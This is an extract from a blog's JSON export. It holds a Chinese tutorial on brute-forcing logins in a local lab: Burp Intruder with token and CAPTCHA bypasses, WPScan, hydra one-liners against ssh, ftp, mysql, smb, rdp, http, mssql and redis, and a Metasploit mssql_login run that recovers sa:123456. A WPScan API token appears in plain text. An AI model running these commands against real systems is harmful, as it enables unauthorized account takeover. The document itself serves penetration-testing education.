WORKSTATION\\sa:123456</span><br><span class=\"line\">[*] 192.168.31.57:1433    - Scanned 1 of 1 hosts (100% complete)</span><br><span class=\"line\">[*] 192.168.31.57:1433    - Bruteforce completed, 1 credential was successful.</span><br><span class=\"line\">[*] 192.168.31.57:1433    - You can open an MSSQL session with these credentials and CreateSession <span class=\"built_in\">set</span> to <span class=\"literal\">true</span></span><br><span class=\"line\">[*] Auxiliary module execution completed</span><br></pre></td></tr></tbody></table></figure>\n\n","abbrlink":"e93fc31a","length":3879,"excerpt":"","more":"<blockquote>\n<p>本文出现域名均为搭建的本地靶场域名</p>\n</blockquote>\n<h2 id=\"1-概述\"><a href=\"#1-概述\" class=\"headerlink\" title=\"1 概述\"></a>1 概述</h2><p>​\t穷举就是枚举的意思，在互联网的今天，需要使用某种的服务，大多数都需要口令登录，这个口令就是密码，密码的强度分为，弱口令、中度口令、强度口令。如果登录的服务为弱口令，那会存在很大的安全隐患，黑客通过穷举弱口令对服务进行攻击，很容易就得到登录密码。得到密码之后就能登录服务，进行其他危害较大得操作。黑客也能通过对用户得信息整理，组合密码进行穷举攻击。例如根据用户的生日号码，出身年月日和姓名进行口令组合，再对其服务进行穷举。</p>\n<p><strong>常见服务</strong></p>\n<table>\n<thead>\n<tr>\n<th>服务</th>\n<th>端口</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>web</td>\n<td>80</td>\n</tr>\n<tr>\n<td>mysql</td>\n<td>3306</td>\n</tr>\n<tr>\n<td>Microsoft SQL Server</td>\n<td>1433</td>\n</tr>\n<tr>\n<td>https</td>\n<td>443</td>\n</tr>\n<tr>\n<td>ftp</td>\n<td>21</td>\n</tr>\n<tr>\n<td>ssh</td>\n<td>22</td>\n</tr>\n<tr>\n<td>dns</td>\n<td>53</td>\n</tr>\n<tr>\n<td>tomcat</td>\n<td>8080</td>\n</tr>\n<tr>\n<td>redis</td>\n<td>6379</td>\n</tr>\n<tr>\n<td>rsync</td>\n<td>873</td>\n</tr>\n<tr>\n<td>PostgreSQL</td>\n<td>5432</td>\n</tr>\n<tr>\n<td>cobaltstrike teamserver</td>\n<td>50050</td>\n</tr>\n<tr>\n<td>smtp</td>\n<td>25</td>\n</tr>\n<tr>\n<td>pop3</td>\n<td>110</td>\n</tr>\n<tr>\n<td>远程终端rdp</td>\n<td>3389</td>\n</tr>\n<tr>\n<td>smb</td>\n<td>445</td>\n</tr>\n<tr>\n<td>rpc</td>\n<td>135</td>\n</tr>\n<tr>\n<td>imap</td>\n<td>143</td>\n</tr>\n<tr>\n<td>NetBIOS</td>\n<td>139</td>\n</tr>\n<tr>\n<td>SMTPS</td>\n<td>465</td>\n</tr>\n<tr>\n<td>POP3S</td>\n<td>995</td>\n</tr>\n<tr>\n<td>mogodb</td>\n<td>27018</td>\n</tr>\n<tr>\n<td>memcached</td>\n<td>11211</td>\n</tr>\n<tr>\n<td>telnet</td>\n<td>23</td>\n</tr>\n<tr>\n<td>oracle</td>\n<td>1521</td>\n</tr>\n</tbody></table>\n<h2 id=\"2-burpsuite穷举后台密码\"><a href=\"#2-burpsuite穷举后台密码\" class=\"headerlink\" title=\"2 burpsuite穷举后台密码\"></a>2 burpsuite穷举后台密码</h2><p>抓包，然后放到Intruder模块，添加payload位置</p>\n<img src=\"/posts/undefined/image-20250312225424438.png\" class=\"\" title=\"image-20250312225424438\">\n\n<p>加载payloads</p>\n<img src=\"/posts/undefined/image-20250312225451754.png\" class=\"\" title=\"image-20250312225451754\">\n\n<p>开始攻击，爆破出密码</p>\n<img src=\"/posts/undefined/image-20250312225540034.png\" class=\"\" title=\"image-20250312225540034\">\n\n<p>成功登录后台</p>\n<img src=\"/posts/undefined/image-20250312225644180.png\" class=\"\" title=\"image-20250312225644180\">\n\n\n\n<h2 id=\"3-带有Token防御的穷举爆破\"><a href=\"#3-带有Token防御的穷举爆破\" class=\"headerlink\" title=\"3 带有Token防御的穷举爆破\"></a>3 带有Token防御的穷举爆破</h2><p>有的网站存在一次性Token，再用过一次后就失效了，导致没办法爆破</p>\n<img src=\"/posts/undefined/image-20250312230827144.png\" class=\"\" title=\"image-20250312230827144\">\n\n<p>这里可以使用burpsuite的宏设置，打开<code>Settings</code>中的<code>Session</code>。</p>\n<img src=\"/posts/undefined/image-20250312231604753.png\" class=\"\" title=\"image-20250312231604753\">\n\n<p>添加规则，选择运行宏。</p>\n<img src=\"/posts/undefined/image-20250312231626743.png\" class=\"\" title=\"image-20250312231626743\">\n\n<p>选择添加宏</p>\n<img src=\"/posts/undefined/image-20250312231721421.png\" class=\"\" title=\"image-20250312231721421\">\n\n<p>这里选择包含Token的响应</p>\n<img src=\"/posts/undefined/image-20250312231837586.png\" class=\"\" title=\"image-20250312231837586\">\n\n<p>选择项目设置，在自定义参数位置添加，选择要获取的参数，这里要注意<strong>参数名一定要一致</strong></p>\n<img src=\"/posts/undefined/image-20250312232023480.png\" class=\"\" title=\"image-20250312232023480\">\n\n<p>一通确认，将更改参数名设置一下</p>\n<img src=\"/posts/undefined/image-20250312232151766.png\" class=\"\" title=\"image-20250312232151766\">\n\n<p>可以更改一下作用范围</p>\n<img src=\"/posts/undefined/image-20250312232336232.png\" class=\"\" title=\"image-20250312232336232\">\n\n<p>然后就可以开始爆破了，不过还是会有一些几率替换失败，感觉是爆破线程过高的原因，调低线程以后爆破成功了。</p>\n<img src=\"/posts/undefined/image-20250312233222030.png\" class=\"\" title=\"image-20250312233222030\">\n\n\n<h2 id=\"4-针对有验证码的穷举爆破\"><a href=\"#4-针对有验证码的穷举爆破\" class=\"headerlink\" title=\"4 针对有验证码的穷举爆破\"></a>4 针对有验证码的穷举爆破</h2><h3 id=\"4-1-Cookie不存在不验证绕过\"><a href=\"#4-1-Cookie不存在不验证绕过\" class=\"headerlink\" title=\"4.1 Cookie不存在不验证绕过\"></a>4.1 Cookie不存在不验证绕过</h3><p>在请求包Cookie中存在字段<code>PHPSESSID</code></p>\n<img src=\"/posts/undefined/image-20250312234452887.png\" class=\"\" title=\"image-20250312234452887\">\n\n<p>其值其实对应于一个文件</p>\n<img src=\"/posts/undefined/image-20250312234548755.png\" class=\"\" title=\"image-20250312234548755\">\n\n<p>这里如果对其没有验证，则可以删除<code>PHPSESSID</code>实现绕过，爆破成功</p>\n<img src=\"/posts/undefined/image-20250312234722354.png\" class=\"\" title=\"image-20250312234722354\">\n\n<img src=\"/posts/undefined/image-20250312234834804.png\" class=\"\" title=\"image-20250312234834804\">\n\n<h3 id=\"4-2-后台验证码不销毁绕过\"><a href=\"#4-2-后台验证码不销毁绕过\" class=\"headerlink\" title=\"4.2 后台验证码不销毁绕过\"></a>4.2 后台验证码不销毁绕过</h3><p>有的网站验证码在使用后不会销毁，可以复用，达到绕过</p>\n<img src=\"/posts/undefined/image-20250312235311801.png\" class=\"\" title=\"image-20250312235311801\">\n\n<img src=\"/posts/undefined/image-20250312235427207.png\" class=\"\" title=\"image-20250312235427207\">\n\n<h3 id=\"4-3-验证码识别爆破\"><a href=\"#4-3-验证码识别爆破\" class=\"headerlink\" title=\"4.3 验证码识别爆破\"></a>4.3 验证码识别爆破</h3><p>使用验证码识别工具，直接识别出验证码值，进行爆破</p>\n<img src=\"/posts/undefined/image-20250313000046133.png\" class=\"\" title=\"image-20250313000046133\">\n\n<p>这里正常抓包，添加爆破位置，添加验证码路径，载入字典即可，在载入字典时需修改<code>Line Endings</code>为<code>Windows</code>，不然字典导不进去</p>\n<img src=\"/posts/undefined/image-20250313000648523.png\" class=\"\" title=\"image-20250313000648523\">\n\n<img src=\"/posts/undefined/image-20250313001039560.png\" class=\"\" title=\"image-20250313001039560\">\n\n<p>填写验证码错误信息，即可开始爆破</p>\n<img src=\"/posts/undefined/image-20250313001105420.png\" class=\"\" title=\"image-20250313001105420\">\n\n\n\n<h2 id=\"5-一些常见软件登录穷举\"><a href=\"#5-一些常见软件登录穷举\" class=\"headerlink\" title=\"5 一些常见软件登录穷举\"></a>5 一些常见软件登录穷举</h2><h3 id=\"5-1-phpmyadmin\"><a href=\"#5-1-phpmyadmin\" class=\"headerlink\" title=\"5.1 phpmyadmin\"></a>5.1 phpmyadmin</h3><p>通常爆破<code>admin</code>，<code>root</code>，<code>test</code>用户密码</p>\n<img src=\"/posts/undefined/image-20250317212314918.png\" class=\"\" title=\"image-20250317212314918\">\n\n<p><a href=\"https://bbs.kanxue.com/thread-159062.htm\">下载地址</a></p>\n<h3 id=\"5-2-WordPress\"><a href=\"#5-2-WordPress\" class=\"headerlink\" title=\"5.2 WordPress\"></a>5.2 WordPress</h3><p>可以拼接路径，查看账户信息<code>/wp-json/wp/v2/users</code></p>\n<img src=\"/posts/undefined/image-20250317215045138.png\" class=\"\" title=\"image-20250317215045138\">\n\n<p>使用<code>WPScan</code>工具，首先在<a href=\"https://wpscan.com/\">WPScan</a>注册账户获取<code>token</code>，使用以下命令</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ wpscan --url http://xxx.com -e u -P ./top1000.txt --api-token 6qGDsJorRIvSazNIg9s4mwjxX8nOUPRL3to6fdJgwoo</span><br></pre></td></tr></table></figure>\n\n<img src=\"/posts/undefined/image-20250317215215191.png\" class=\"\" title=\"image-20250317215215191\">\n\n<h2 id=\"6-hydra工具使用\"><a href=\"#6-hydra工具使用\" class=\"headerlink\" title=\"6 hydra工具使用\"></a>6 hydra工具使用</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-l login 小写，指定用户名进行破解</span><br><span class=\"line\">-L file 大写，指定用户的用户名字典</span><br><span class=\"line\">-p pass 小写，用于指定密码破解，很少使用，一般采用密码字典。</span><br><span class=\"line\">-P file 大写，用于指定密码字典。</span><br><span class=\"line\">-e ns 额外的选项，n：空密码试探，s：使用指定账户和密码试探</span><br><span class=\"line\">-M file 指定目标ip列表文件，批量破解。</span><br><span class=\"line\">-o file 指定结果输出文件</span><br><span class=\"line\">-f 找到第一对登录名或者密码的时候中止破解。</span><br><span class=\"line\">-t tasks 同时运行的线程数，默认是16</span><br><span class=\"line\">-w <span class=\"keyword\">time</span> 设置最大超时时间，单位</span><br><span class=\"line\">-v / -V 显示详细过程</span><br><span class=\"line\">-R 恢复爆破（如果破解中断了，下次执行 hydra -R /path/to/hydra.restore 就可以继续任务。）</span><br><span class=\"line\">-x 自定义密码</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"6-1-ssh\"><a href=\"#6-1-ssh\" class=\"headerlink\" title=\"6.1 ssh\"></a>6.1 ssh</h3><p><strong>配置Ubuntu root用户ssh登录</strong></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ <span class=\"built_in\">sudo</span> apt install openssh-server <span class=\"comment\"># 安装ssh</span></span><br><span class=\"line\">$ <span class=\"built_in\">sudo</span> nano /etc/ssh/sshd_config</span><br><span class=\"line\"><span class=\"comment\"># PermitRootLogin prohibit-password ——&gt; PermitRootLogin yes</span></span><br><span class=\"line\">$ <span class=\"built_in\">sudo</span> service ssh restart <span class=\"comment\"># 重启ssh服务</span></span><br></pre></td></tr></table></figure>\n\n<p>使用<code>hydra</code>对ssh密码进行爆破</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hydra -l root -P ./top500.txt -e ns -vV -t 1 -f 192.168.31.50 ssh</span><br></pre></td></tr></table></figure>\n\n<img src=\"/posts/undefined/image-20250317232800500.png\" class=\"\" title=\"image-20250317232800500\">\n\n<h3 id=\"6-2-ftp\"><a href=\"#6-2-ftp\" class=\"headerlink\" title=\"6.2 ftp\"></a>6.2 ftp</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hydra -l c5moon -P ./top500.txt -e ns -vV 192.168.31.51 ftp</span><br></pre></td></tr></table></figure>\n\n<img src=\"/posts/undefined/image-20250317233427264.png\" class=\"\" title=\"image-20250317233427264\">\n\n<h3 id=\"6-3-mysql\"><a href=\"#6-3-mysql\" class=\"headerlink\" title=\"6.3 mysql\"></a>6.3 mysql</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hydra -l root -P ./top500.txt -e ns -vV -f 192.168.31.57 mysql</span><br></pre></td></tr></table></figure>\n\n<img src=\"/posts/undefined/image-20250317233635882.png\" class=\"\" title=\"image-20250317233635882\">\n\n<h3 id=\"6-4-smb\"><a href=\"#6-4-smb\" class=\"headerlink\" title=\"6.4 smb\"></a>6.4 smb</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hydra -l administrator -P ./top500.txt -e ns -vV -f 192.168.31.57 smb</span><br></pre></td></tr></table></figure>\n\n<img src=\"/posts/undefined/image-20250317234038917.png\" class=\"\" title=\"image-20250317234038917\">\n\n<h3 id=\"6-5-rdp\"><a href=\"#6-5-rdp\" class=\"headerlink\" title=\"6.5 rdp\"></a>6.5 rdp</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hydra -l administrator -P ./top500.txt -e ns -vV -f 192.168.31.57 rdp</span><br></pre></td></tr></table></figure>\n\n<img src=\"/posts/undefined/image-20250317234329708.png\" class=\"\" title=\"image-20250317234329708\">\n\n<h3 id=\"6-6-http\"><a href=\"#6-6-http\" class=\"headerlink\" title=\"6.6 http\"></a>6.6 http</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hydra -l admin -P ./top500.txt -vV -f www.c1moon.com http-post-form <span class=\"string\">&quot;/admin/index.php:user=^USER^&amp;ps=^PASS^&amp;action=login:login-error&quot;</span></span><br></pre></td></tr></table></figure>\n\n<img src=\"/posts/undefined/image-20250317235246581.png\" class=\"\" title=\"image-20250317235246581\">\n\n<h3 id=\"6-7-mssql\"><a href=\"#6-7-mssql\" class=\"headerlink\" title=\"6.7 mssql\"></a>6.7 mssql</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hydra -l sa -P ./top500.txt -e ns -vV -f 192.168.31.57 mssql</span><br></pre></td></tr></table></figure>\n\n<img src=\"/posts/undefined/image-20250317235614010.png\" class=\"\" title=\"image-20250317235614010\">\n\n<h3 id=\"6-8-redis\"><a href=\"#6-8-redis\" class=\"headerlink\" title=\"6.8 redis\"></a>6.8 redis</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hydra -P ./top500.txt -e ns -vV -f 192.168.31.57 redis</span><br></pre></td></tr></table></figure>\n\n<img src=\"/posts/undefined/image-20250317235842515.png\" class=\"\" title=\"image-20250317235842515\">\n\n<h2 id=\"7-metasploite穷举模块\"><a href=\"#7-metasploite穷举模块\" class=\"headerlink\" title=\"7 metasploite穷举模块\"></a>7 metasploite穷举模块</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ msfconsole <span class=\"comment\"># 启动msf</span></span><br><span class=\"line\"></span><br><span class=\"line\">msf6 &gt; search auxiliary/scanner/mssql/mssql_login <span class=\"comment\"># 搜索模块</span></span><br><span class=\"line\"></span><br><span class=\"line\">Matching Modules</span><br><span class=\"line\">================</span><br><span class=\"line\"></span><br><span class=\"line\">   <span class=\"comment\">#  Name                                 Disclosure Date  Rank    Check  Description</span></span><br><span class=\"line\">   -  ----                                 ---------------  ----    -----  -----------</span><br><span class=\"line\">   0  auxiliary/scanner/mssql/mssql_login  .                normal  No     MSSQL Login Utility</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/mssql/mssql_login</span><br><span class=\"line\"></span><br><span class=\"line\">msf6 &gt; use auxiliary/scanner/mssql/mssql_login <span class=\"comment\"># 使用模块</span></span><br><span class=\"line\">[*] New <span class=\"keyword\">in</span> Metasploit 6.4 - The CreateSession option within this module can open an interactive session</span><br><span class=\"line\"></span><br><span class=\"line\">msf6 auxiliary(scanner/mssql/mssql_login) &gt; info <span class=\"comment\"># 查看模块信息</span></span><br></pre></td></tr></table></figure>\n\n<img src=\"/posts/undefined/image-20250318000514529.png\" class=\"\" title=\"image-20250318000514529\">\n\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">msf6 auxiliary(scanner/mssql/mssql_login) &gt; show options <span class=\"comment\"># 显示参数</span></span><br></pre></td></tr></table></figure>\n\n<img src=\"/posts/undefined/image-20250318001134113.png\" class=\"\" title=\"image-20250318001134113\">\n\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">msf6 auxiliary(scanner/mssql/mssql_login) &gt; <span class=\"built_in\">set</span> RHOSTS 192.168.31.57</span><br><span class=\"line\">RHOSTS =&gt; 192.168.31.57</span><br><span class=\"line\">msf6 auxiliary(scanner/mssql/mssql_login) &gt; <span class=\"built_in\">set</span> STOP_ON_SUCCESS <span class=\"literal\">true</span></span><br><span class=\"line\">STOP_ON_SUCCESS =&gt; <span class=\"literal\">true</span></span><br><span class=\"line\">msf6 auxiliary(scanner/mssql/mssql_login) &gt; <span class=\"built_in\">set</span> PASS_FILE ./top500.txt</span><br><span class=\"line\">PASS_FILE =&gt; ./top500.txt</span><br><span class=\"line\">msf6 auxiliary(scanner/mssql/mssql_login) &gt; run</span><br><span class=\"line\"></span><br><span class=\"line\">[*] 192.168.31.57:1433    - 192.168.31.57:1433 - MSSQL - Starting authentication scanner.</span><br><span class=\"line\">[!] 192.168.31.57:1433    - No active DB -- Credential data will not be saved!</span><br><span class=\"line\">[-] 192.168.31.57:1433    - 192.168.31.57:1433 - LOGIN FAILED: WORKSTATION\\sa: (Incorrect: )</span><br><span class=\"line\">[+] 192.168.31.57:1433    - 192.168.31.57:1433 - Login Successful: WORKSTATION\\sa:123456</span><br><span class=\"line\">[*] 192.168.31.57:1433    - Scanned 1 of 1 hosts (100% complete)</span><br><span class=\"line\">[*] 192.168.31.57:1433    - Bruteforce completed, 1 credential was successful.</span><br><span class=\"line\">[*] 192.168.31.57:1433    - You can open an MSSQL session with these credentials and CreateSession <span class=\"built_in\">set</span> to <span class=\"literal\">true</span></span><br><span class=\"line\">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure>\n\n"}],"PostAsset":[{"_id":"source/_posts/js逆向/image-20250312004307050.png","post":"cm8d9pkhk0001lsjf7n5ef0v0","slug":"image-20250312004307050.png","modified":1,"renderable":0},{"_id":"source/_posts/js逆向/image-20250312005430526.png","post":"cm8d9pkhk0001lsjf7n5ef0v0","slug":"image-20250312005430526.png","modified":1,"renderable":0},{"_id":"source/_posts/js逆向/image-20250312005550419.png","post":"cm8d9pkhk0001lsjf7n5ef0v0","slug":"image-20250312005550419.png","modified":1,"renderable":0},{"_id":"source/_posts/js逆向/image-20250312005630018.png","post":"cm8d9pkhk0001lsjf7n5ef0v0","slug":"image-20250312005630018.png","modified":1,"renderable":0},{"_id":"source/_posts/sql注入/image-20250305014536324.png","post":"cm8d9pkhn0003lsjfa4jigmdf","slug":"image-20250305014536324.png","modified":1,"renderable":0},{"_id":"source/_posts/sql注入/image-20250306000604769.png","post":"cm8d9pkhn0003lsjfa4jigmdf","slug":"image-20250306000604769.png","modified":1,"renderable":0},{"_id":"source/_posts/sql注入/image-20250306001213412.png","post":"cm8d9pkhn0003lsjfa4jigmdf","slug":"image-20250306001213412.png","modified":1,"renderable":0},{"_id":"source/_posts/sql注入/image-20250306003105176.png","post":"cm8d9pkhn0003lsjfa4jigmdf","slug":"image-20250306003105176.png","modified":1,"renderable":0},{"_id":"source/_posts/sql注入/image-20250310220651812.png","post":"cm8d9pkhn0003lsjfa4jigmdf","slug":"image-20250310220651812.png","modified":1,"renderable":0},{"_id":"source/_posts/sql注入/image-20250310220934038.png","post":"cm8d9pkhn0003lsjfa4jigmdf","slug":"image-20250310220934038.png","modified":1,"renderable":0},{"_id":"source/_posts/sql注入/image-20250310224830354.png","post":"cm8d9pkhn0003lsjfa4jigmdf","slug":"image-20250310224830354.png","modified":1,"renderable":0},{"_id":"source/_posts/sql注入/image-20250310230842396.png","post":"cm8d9pkhn0003lsjfa4jigmdf","slug":"image-20250310230842396.png","modified":1,"renderable":0},{"_id":"source/_posts/sql注入/image-20250310232549937.png","post":"cm8d9pkhn0003lsjfa4jigmdf","slug":"image-20250310232549937.png","modified":1,"renderable":0},{"_id":"source/_posts/sql注入/image-20250310232652649.png","post":"cm8d9pkhn0003lsjfa4jigmdf","slug":"image-20250310232652649.png","modified":1,"renderable":0},{"_id":"source/_posts/sql注入/image-20250311002549978.png","post":"cm8d9pkhn0003lsjfa4jigmdf","slug":"image-20250311002549978.png","modified":1,"renderable":0},{"_id":"source/_posts/穷举/image-20250312225424438.png","post":"cm8d9pkhu000blsjf420z4e8z","slug":"image-20250312225424438.png","modified":1,"renderable":0},{"_id":"source/_posts/穷举/image-20250312225451754.png","post":"cm8d9pkhu000blsjf420z4e8z","slug":"image-20250312225451754.png","modified":1,"renderable":0},{"_id":"source/_posts/穷举/image-20250312225540034.png","post":"cm8d9pkhu000blsjf420z4e8z","slug":"image-20250312225540034.png","modified":1,"renderable":0},{"_id":"source/_posts/穷举/image-20250312225644180.png","post":"cm8d9pkhu000blsjf420z4e8z","slug":"image-20250312225644180.png","modified":1,"renderable":0},{"_id":"source/_posts/穷举/image-20250312230827144.png","post":"cm8d9pkhu000blsjf420z4e8z","slug":"image-20250312230827144.png","modified":1,"renderable":0},{"_id":"source/_posts/穷举/image-20250312231604753.png","post":"cm8d9pkhu000blsjf420z4e8z","slug":"image-20250312231604753.png","modified":1,"renderable":0},{"_id":"source/_posts/穷举/image-20250312231626743.png","post":"cm8d9pkhu000blsjf420z4e8z","slug":"image-20250312231626743.png","modified":1,"renderable":0},{"_id":"source/_posts/穷举/image-20250312231721421.png","post":"cm8d9pkhu000blsjf420z4e8z","slug":"image-20250312231721421.png","modified":1,"renderable":0},{"_id":"source/_posts/穷举/image-20250312231837586.png","post":"cm8d9pkhu000blsjf420z4e8z","slug":"image-20250312231837586.png","modified":1,"renderable":0},{"_id":"source/_posts/穷举/image-20250312232023480.png","post":"cm8d9pkhu000blsjf420z4e8z","slug":"image-20250312232023480.png","modified":1,"renderable":0},{"_id":"source/_posts/穷举/image-20250312232151766.png","post":"cm8d9pkhu000blsjf420z4e8z","slug":"image-20250312232151766.png","modified":1,"renderable":0},{"_id":"source/_posts/穷举/image-20250312232336232.png","post":"cm8d9pkhu000blsjf420z4e8z","slug":"image-20250312232336232.png","modified":1,"renderable":0},{"_id":"source/_posts/穷举/image-20250312233222030.png","post":"cm8d9pkhu000blsjf420z4e8z","slug":"image-20250312233222030.png","modified":1,"renderable":0},{"_id":"source/_posts/穷举/image-20250312234452887.png","post":"cm8d9pkhu000blsjf420z4e8z","slug":"image-20250312234452887.png","modified":1,"renderable":0},{"_id":"source/_posts/穷举/image-20250312234548755.png","post":"cm8d9pkhu000blsjf420z4e8z","slug":"image-20250312234548755.png","modified":1,"renderable":0},{"_id":"source/_posts/穷举/image-20250312234722354.png","post":"cm8d9pkhu000blsjf420z4e8z","slug":"image-20250312234722354.png","modified":1,"renderable":0},{"_id":"source/_posts/穷举/image-20250312234834804.png","post":"cm8d9pkhu000blsjf420z4e8z","slug":"image-20250312234834804.png","modified":1,"renderable":0},{"_id":"source/_posts/穷举/image-20250312235311801.png","post":"cm8d9pkhu000blsjf420z4e8z","slug":"image-20250312235311801.png","modified":1,"renderable":0},{"_id":"source/_posts/穷举/image-20250312235427207.png","post":"cm8d9pkhu000blsjf420z4e8z","slug":"image-20250312235427207.png","modified":1,"renderable":0},{"_id":"source/_posts/穷举/image-20250313000046133.png","post":"cm8d9pkhu000blsjf420z4e8z","slug":"image-20250313000046133.png","modified":1,"renderable":0},{"_id":"source/_posts/穷举/image-20250313000648523.png","post":"cm8d9pkhu000blsjf420z4e8z","slug":"image-20250313000648523.png","modified":1,"renderable":0},{"_id":"source/_posts/穷举/image-20250313001039560.png","post":"cm8d9pkhu000blsjf420z4e8z","slug":"image-20250313001039560.png","modified":1,"renderable":0},{"_id":"source/_posts/穷举/image-20250313001105420.png","post":"cm8d9pkhu000blsjf420z4e8z","slug":"image-20250313001105420.png","modified":1,"renderable":0},{"_id":"source/_posts/穷举/image-20250317212314918.png","post":"cm8d9pkhu000blsjf420z4e8z","slug":"image-20250317212314918.png","modified":1,"renderable":0},{"_id":"source/_posts/穷举/image-20250317215045138.png","post":"cm8d9pkhu000blsjf420z4e8z","slug":"image-20250317215045138.png","modified":1,"renderable":0},{"_id":"source/_posts/穷举/image-20250317215215191.png","post":"cm8d9pkhu000blsjf420z4e8z","slug":"image-20250317215215191.png","modified":1,"renderable":0},{"_id":"source/_posts/穷举/image-20250317232800500.png","post":"cm8d9pkhu000blsjf420z4e8z","slug":"image-20250317232800500.png","modified":1,"renderable":0},{"_id":"source/_posts/穷举/image-20250317233427264.png","post":"cm8d9pkhu000blsjf420z4e8z","slug":"image-20250317233427264.png","modified":1,"renderable":0},{"_id":"source/_posts/穷举/image-20250317233635882.png","post":"cm8d9pkhu000blsjf420z4e8z","slug":"image-20250317233635882.png","modified":1,"renderable":0},{"_id":"source/_posts/穷举/image-20250317234038917.png","post":"cm8d9pkhu000blsjf420z4e8z","slug":"image-20250317234038917.png","modified":1,"renderable":0},{"_id":"source/_posts/穷举/image-20250317234329708.png","post":"cm8d9pkhu000blsjf420z4e8z","slug":"image-20250317234329708.png","modified":1,"renderable":0},{"_id":"source/_posts/穷举/image-20250317235246581.png","post":"cm8d9pkhu000blsjf420z4e8z","slug":"image-20250317235246581.png","modified":1,"renderable":0},{"_id":"source/_posts/穷举/image-20250317235614010.png","post":"cm8d9pkhu000blsjf420z4e8z","slug":"image-20250317235614010.png","modified":1,"renderable":0},{"_id":"source/_posts/穷举/image-20250317235842515.png","post":"cm8d9pkhu000blsjf420z4e8z","slug":"image-20250317235842515.png","modified":1,"renderable":0},{"_id":"source/_posts/穷举/image-20250318000514529.png","post":"cm8d9pkhu000blsjf420z4e8z","slug":"image-20250318000514529.png","modified":1,"renderable":0},{"_id":"source/_posts/穷举/image-20250318001134113.png","post":"cm8d9pkhu000blsjf420z4e8z","slug":"image-20250318001134113.png","modified":1,"renderable":0}],"PostCategory":[],"PostTag":[{"post_id":"cm8d9pkhk0001lsjf7n5ef0v0","tag_id":"cm8d9pkhp0004lsjffrm6gndw","_id":"cm8d9pkhs0006lsjf9pz454g2"},{"post_id":"cm8d9pkhn0003lsjfa4jigmdf","tag_id":"cm8d9pkhp0004lsjffrm6gndw","_id":"cm8d9pkhs0007lsjfcm739yd3"},{"post_id":"cm8d9pkht0008lsjf5nws5k3c","tag_id":"cm8d9pkhp0004lsjffrm6gndw","_id":"cm8d9pkhu000alsjf2m5o7w06"},{"post_id":"cm8d9pkht0009lsjfdpif0tw6","tag_id":"cm8d9pkhp0004lsjffrm6gndw","_id":"cm8d9pkhv000clsjf48qh0809"},{"post_id":"cm8d9pkhu000blsjf420z4e8z","tag_id":"cm8d9pkhp0004lsjffrm6gndw","_id":"cm8d9pkhv000dlsjfc2bg8la0"}],"Tag":[{"name":"网络安全","_id":"cm8d9pkhp0004lsjffrm6gndw"}]}}